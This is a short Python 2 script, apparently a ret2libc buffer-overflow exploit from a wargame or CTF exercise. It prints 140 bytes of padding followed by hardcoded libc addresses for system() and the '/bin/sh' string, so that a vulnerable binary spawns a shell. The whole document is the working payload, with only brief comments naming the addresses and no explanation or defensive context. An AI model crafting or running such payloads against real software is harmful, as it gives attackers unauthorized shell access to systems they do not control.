#!/usr/bin/python

# system("/bin/sh")
# 0xb7e6b060 - address of the "system" call
# 0xb7f8cc58 - address of "/bin/sh" string

print "A" * 140 + "\x60\xb0\xe6\xb7" + "pepe" + "\x58\xcc\xf8\xb7"
